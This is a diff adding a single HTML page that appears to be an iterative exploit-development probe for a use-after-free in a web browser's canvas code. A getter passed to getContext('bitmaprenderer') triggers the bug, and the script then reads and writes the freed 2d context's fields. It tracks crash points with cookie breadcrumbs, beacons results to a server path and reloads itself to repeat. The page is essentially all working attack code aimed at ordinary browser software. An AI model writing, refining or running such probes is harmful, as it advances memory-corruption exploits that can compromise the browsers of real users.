@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V601</title></head>
+<body><pre id="out">V601</pre>
+<script>
+/* V601 — Minimal UAF lineWidth diagnostic
+ * Pinpoints WHERE the crash occurs using cookie breadcrumbs.
+ * String LITERALS for cookies = no MarkedSpace allocation.
+ * Nulls innerCtx before any dynamic string ops. */
+'use strict';
+var O=document.getElementById('out');
+
+/* Phase 0: Check cookies for prior breadcrumb or result */
+var prior='',crumb='';
+try{
+  var ck=document.cookie;
+  var m1=ck.match(/v601r=([^;]+)/);
+  if(m1) prior=decodeURIComponent(m1[1]);
+  var m2=ck.match(/v601c=([^;]+)/);
+  if(m2) crumb=m2[1];
+}catch(e){}
+
+if(prior){
+  O.textContent='V601 PRIOR: '+prior;
+  new Image().src='/beacon/V601-PRIOR?d='+encodeURIComponent(prior)+'&t='+Date.now();
+  setTimeout(function(){
+    new Image().src='/beacon/V601-PRIOR?d='+encodeURIComponent(prior)+'&t='+Date.now()+'&r=2';
+  },300);
+  document.cookie='v601r=;max-age=0';
+  document.cookie='v601c=;max-age=0';
+  setTimeout(runTest,2000);
+} else if(crumb){
+  O.textContent='V601 CRASH at: '+crumb;
+  new Image().src='/beacon/V601-CRASH?d=crumb%3D'+crumb+'&t='+Date.now();
+  setTimeout(function(){
+    new Image().src='/beacon/V601-CRASH?d=crumb%3D'+crumb+'&t='+Date.now()+'&r=2';
+  },300);
+  document.cookie='v601c=;max-age=0';
+  setTimeout(runTest,2000);
+} else {
+  runTest();
+}
+
+function runTest(){
+  O.textContent='V601 running...';
+  new Image().src='/beacon/V601-BOOT?d=run&t='+Date.now();
+
+  var canvas=document.createElement('canvas');
+  canvas.width=1;canvas.height=1;
+  var innerCtx=null;
+  var MARKER=6.02214076e23;
+  var R=[0,0,0,0,0,0,0,0]; /* pre-alloc number slots */
+
+  var dict={};
+  Object.defineProperty(dict,'alpha',{get:function(){
+    innerCtx=canvas.getContext('2d');
+    for(var i=0;i<8;i++) innerCtx.save();
+    innerCtx.lineWidth=MARKER;
+    innerCtx.miterLimit=7.77;
+    innerCtx.globalAlpha=0.42;
+    innerCtx.shadowBlur=3.33;
+    innerCtx.lineDashOffset=5.55;
+    return true;
+  }});
+
+  /* Breadcrumb: about to trigger UAF (string literal = no alloc) */
+  try{document.cookie='v601c=preUAF;max-age=60';}catch(e){}
+
+  /* TRIGGER UAF */
+  canvas.getContext('bitmaprenderer',dict);
+
+  /* Breadcrumb: UAF fired, about to read */
+  try{document.cookie='v601c=postUAF;max-age=60';}catch(e){}
+
+  /* === CRITICAL: read freed context. Zero new JS allocations. === */
+  try{R[0]=innerCtx.lineWidth;}catch(e){R[0]=-1;}
+  try{document.cookie='v601c=postLW;max-age=60';}catch(e){}
+
+  try{R[1]=innerCtx.miterLimit;}catch(e){R[1]=-2;}
+  try{document.cookie='v601c=postML;max-age=60';}catch(e){}
+
+  try{R[2]=innerCtx.globalAlpha;}catch(e){R[2]=-3;}
+  try{R[3]=innerCtx.lineDashOffset;}catch(e){R[3]=-4;}
+  try{R[4]=innerCtx.shadowBlur;}catch(e){R[4]=-5;}
+
+  /* Write test */
+  try{innerCtx.lineWidth=1.717;R[5]=innerCtx.lineWidth;}catch(e){R[5]=-6;}
+
+  try{document.cookie='v601c=postAll;max-age=60';}catch(e){}
+
+  /* === CRITICAL: null wrapper BEFORE any dynamic string operation ===
+   * This makes the freed context's JS wrapper unreachable.
+   * GC triggered during subsequent string allocs won't visit it. */
+  innerCtx=null;
+  canvas=null;
+  dict=null;
+
+  /* Now safe: build result string (involves JS string allocation) */
+  var res='lw='+R[0]+'|ml='+R[1]+'|ga='+R[2]+'|ldo='+R[3]+'|sb='+R[4]+'|w='+R[5];
+  try{document.cookie='v601r='+encodeURIComponent(res)+';max-age=120';}catch(e){}
+  try{document.cookie='v601c=;max-age=0';}catch(e){}
+
+  O.textContent='V601: '+res;
+
+  /* Beacon result */
+  try{
+    new Image().src='/beacon/V601-RESULT?d='+encodeURIComponent(res)+'&t='+Date.now();
+  }catch(e){}
+  setTimeout(function(){
+    try{
+      new Image().src='/beacon/V601-DONE?d='+encodeURIComponent(res)+'&t='+Date.now();
+    }catch(e){}
+    setTimeout(function(){location.reload();},5000);
+  },2000);
+}
+</script></body></html>
